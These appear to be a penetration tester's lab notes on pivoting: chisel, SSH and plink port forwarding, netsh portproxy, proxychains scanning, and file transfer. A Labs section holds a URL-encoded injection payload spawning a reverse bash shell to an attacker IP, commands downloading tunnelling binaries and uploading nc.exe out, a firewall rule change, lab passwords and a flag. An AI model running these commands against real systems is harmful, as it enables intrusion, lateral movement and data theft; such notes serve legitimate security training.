# Tunnel Proxy Transfer

## Tunnel

### chisel

<https://github.com/jpillora/chisel>

```bash
# server
./chisel server -p 4444 --reverse

# client
./chisel client 172.16.8.144:4444 R:socks

wget 192.168.45.183/chisel_1.9.1_linux_amd64 -O /tmp/chisel && chmod +x /tmp/chisel

/tmp/chisel client 192.168.45.183:8080 R:socks
```

### ssh

#### ssh forwarding

192.168.162.63 straddle WAN and DMZ
10.4.162.215 is in DMZ
172.16.162.217 is in Intranet

```bash
#local port forwarding
ssh -N -L 0.0.0.0:4455:172.16.162.217:445 database_admin@10.4.162.215

smbclient -p 4455 -L //192.168.162.63/ -U hr_admin --password=Welcome1234
```

```bash
# remote port forwarding
ssh -N -R 127.0.0.1:2345:10.4.162.215:5432 parallels@192.168.45.183
```

#### ssh tunnel

```bash
# forward ssh tunnel
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

```bash
# reverse ssh tunnel
ssh -N -R 9090 kali@172.16.8.144
```

### plink

kali ip:172.16.8.144
intranet http server ip:192.168.18.1:80
so this is a reverse tunnel.

```cmd
scp kali@172.16.8.144/usr/share/windows-binaries/plink.exe .
plink -ssh -l kali -pw kali -R 172.16.8.144:5050:192.168.18.1:80 172.16.8.144
```

request to kali:5050 will be forwarded to intranet http server.

### netsh

local windows ip:172.16.8.152
intranet http server ip:192.168.18.1:80
so this is a forward tunnel.

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=172.16.8.152 connectport=80 connectaddress=192.168.18.1
```

request to windows:8080 will be forwarded to intranet http server.

## Proxy

### proxychains

nmap -sT means TCP connect scan, you shuld add -sT when you use proxychains to scan.

```bash
proxychains nmap -sT -vv 192.168.18.1

/etc/proxychains.conf
tcp_read_time_out 1000
tcp_connect_time_out 500
```

## Transfer

### download

#### rdp

```bash
xfreerdp /u:offsec /p:lab /v:192.168.159.61 /drive:home,/home/parallels/Downloads
```

### upload

#### appache php server

/var/www/html/upload.php

```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir.$_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
?>
```

```bash
sudo mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads
```

```powershell
powershell (new-object System.Net.WebClient).UploadFile('http://172.16.8.144/upload.php', 'C:\Users\Public\nc.exe')
```

## Labs

```
http://192.168.162.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.183/4444%200%3E%261%27%29.start%28%29%22%29%7D/

python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh database_admin@10.4.162.215
sqlpass123
ssh -N -L 0.0.0.0:4455:172.16.162.217:445 database_admin@10.4.162.215
smbclient -p 4455 -L //192.168.162.63/ -U hr_admin --password=Welcome1234

ssh -N -R 127.0.0.1:2345:10.4.162.215:5432 parallels@192.168.45.183
ssh -N -R 127.0.0.1:2346:10.4.162.215:5432 parallels@192.168.45.183

psql -h 127.0.0.1 -p 2345 -U postgres


powershell wget -Uri http://192.168.45.183/plink.exe -OutFile C:\Windows\Temp\plink.exe

C:\Windows\Temp\plink.exe -ssh -l parallels -pw 1 -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.183

netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.162.64 connectport=22 connectaddress=10.4.162.215

netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.162.64 localport=2222 action=allow


wget 192.168.45.183/chisel_1.9.1_linux_amd64 -O /tmp/chisel && chmod +x /tmp/chisel

/tmp/chisel client 192.168.45.183:8080 R:socks

7he_C4t_c0ntro11er
```
